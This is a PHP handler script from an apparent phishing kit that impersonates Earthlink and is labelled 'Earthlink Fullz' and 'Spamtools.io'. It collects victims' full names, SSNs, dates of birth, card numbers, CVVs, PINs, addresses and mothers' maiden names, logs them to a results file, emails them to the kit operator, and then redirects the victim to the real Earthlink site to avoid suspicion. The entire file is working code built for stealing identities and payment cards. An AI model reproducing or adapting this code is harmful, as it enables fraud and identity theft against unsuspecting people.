<?php
include '../email.php';
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Earthlink Fullz-----------------------\n";
$message .= "Full Name: ".$_POST['NAME']."\n";
$message .= "Date of Birth: ".$_POST['DOB']."\n";
$message .= "SSN: ".$_POST['SSN']."\n";
$message .= "Card Number: ".$_POST['credit_card_number']."\n";
$message .= "Expiration Month: ".$_POST['expiration_month']."\n";
$message .= "Expiration Year: ".$_POST['expiration_year']."\n";
$message .= "Card CVV: ".$_POST['csv']."\n";
$message .= "Card PIN: ".$_POST['card_pin']."\n";
$message .= "Full Name: ".$_POST['billing_name']."\n";
$message .= "Address: ".$_POST['street_address']."\n";
$message .= "Address2: ".$_POST['street_address2']."\n";
$message .= "City: ".$_POST['city']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "Zip: ".$_POST['zip_code']."\n";
$message .= "Phone: ".$_POST['phonenom']."\n";
$message .= "Mother Maiden Name: ".$_POST['maid']."\n";
$message .= "Country: ".$_POST['country']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-----------------Spamtools.io------------------------------\n";

$subject = "EArthlink Fullz $ip";

$file = fopen("../results/login.txt", 'a');
fwrite($file, $message);
mail($email,$subject,$message);
header("Location: http://myaccount.earthlink.net/");

?>
